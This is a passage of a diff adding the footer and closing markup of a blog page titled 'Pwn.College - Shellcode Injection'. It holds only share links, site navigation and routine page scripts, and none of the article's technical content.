+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&text=Pwn.College - Shellcode Injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&is_video=false&description=Pwn.College - Shellcode Injection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn.College - Shellcode Injection&body=Check out this article: https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&title=Pwn.College - Shellcode Injection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&name=Pwn.College - Shellcode Injection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/&t=Pwn.College - Shellcode Injection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
